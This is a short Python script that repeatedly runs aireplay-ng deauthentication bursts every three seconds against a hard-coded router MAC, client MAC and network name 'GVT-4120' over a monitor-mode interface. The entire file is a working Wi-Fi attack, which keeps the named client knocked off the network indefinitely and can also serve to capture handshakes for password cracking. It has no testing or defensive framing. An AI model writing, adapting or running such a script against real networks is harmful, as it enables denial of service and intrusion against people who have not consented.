from os import system
from time import sleep

ROUTER_MAC = 'FC:6F:B7:E2:41:20'
CLIENT_MAC = '04:D6:AA:8E:85:45'
INTERFACE = 'wlp0s18f2u3mon'
ESSID = 'GVT-4120'

def aireplay():
    while True:
        system('aireplay-ng -0 2 -a {} -c {} -e {} {}'.format(ROUTER_MAC, CLIENT_MAC, ESSID, INTERFACE))
        sleep(3)


aireplay()
